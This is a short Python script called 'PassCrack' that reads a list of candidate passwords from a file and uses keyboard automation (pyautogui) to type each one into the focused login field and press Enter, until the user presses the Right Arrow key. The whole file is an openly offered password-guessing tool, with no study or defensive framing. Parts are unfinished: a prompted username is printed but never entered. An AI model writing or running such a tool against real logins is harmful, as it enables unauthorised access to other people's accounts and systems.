import time
import random
import math
import keyboard
import pyautogui

with open('learning\Test.txt', 'r') as crack:
    list = [line.strip() for line in crack]

N = 0
T = 0

print("""
 __          __  _                            _          _____               _____                _    
 \ \        / / | |                          | |        |  __ \             / ____|              | |   
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___   | |__) |_ _ ___ ___| |     _ __ __ _  ___| | __
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \  |  ___/ _` / __/ __| |    | '__/ _` |/ __| |/ /
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) | | |  | (_| \__ \__ \ |____| | | (_| | (__|   < 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  |_|   \__,_|___/___/\_____|_|  \__,_|\___|_|\_\\
         
""")

A = input("If there is a username i need you to type that here if there is none you can type None: ")

time.sleep(1.5)

print("Starting PassCrack")

if A != "None":
    print(A)

while not keyboard.is_pressed('Right Arrow'):
   time.sleep(0.1)
   pyautogui.typewrite(list[N])
   pyautogui.press('Enter')
   T += 0.1
   N += 1
else:
    N -= 1
    print("PassCrack stopping\nPassCrack has ran for", T * 10, "Seconds\nand the last used password was:", list[N])
